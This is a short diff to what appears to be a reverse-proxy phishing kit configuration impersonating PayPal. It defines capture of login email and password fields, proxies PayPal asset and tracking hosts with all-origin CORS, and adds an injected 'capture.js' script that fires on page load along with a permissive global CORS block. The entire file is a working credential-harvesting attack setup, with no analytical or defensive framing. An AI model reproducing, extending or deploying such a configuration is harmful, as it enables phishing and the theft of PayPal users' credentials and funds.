@@ -26,6 +26,7 @@ credentials:
   - {type: "json_field", name: "login_email", regex: null}
   - {type: "json_field", name: "login_password", regex: null}
 injections:
+  - {type: "js", path: "/core/assets/js/capture.js", trigger: "load"}
   - trigger_path: "/signin"
     position: "body_end"
     content: |
@@ -49,3 +50,7 @@ form_actions:
 bridges:
   - {prefix: "/_objects/", target_host: "www.paypalobjects.com", strip_prefix: true, cors: "allow_all"}
   - {prefix: "/_t/", target_host: "t.paypal.com", strip_prefix: true, cors: "allow_all"}
+cors:
+  mode: "allow_all"
+  methods: ["GET", "POST", "OPTIONS", "PUT", "DELETE"]
+  headers: ["*"]
